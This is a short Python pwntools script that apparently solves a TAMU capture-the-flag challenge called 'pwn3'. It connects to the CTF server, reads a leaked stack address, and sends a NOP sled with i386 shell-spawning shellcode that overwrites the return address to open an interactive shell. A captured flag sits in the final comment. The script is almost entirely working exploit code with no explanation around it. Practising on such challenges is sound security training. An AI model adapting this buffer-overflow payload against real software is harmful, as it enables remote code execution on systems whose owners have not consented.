#!/usr/bin/python
from pwn import *

#r = process("./pwn3")
r = remote("pwn.ctf.tamu.edu", 4323)
buf = int(r.recv(156).split()[22], 16)

shellcode = asm(shellcraft.i386.sh())

print len(shellcode)

payload = "\x90"*148 + shellcode + "\x90"*50 + p32(buf)
r.sendline(payload)
r.interactive()
# gigem{n0w_w3_4r3_g377in6_s74r73d}
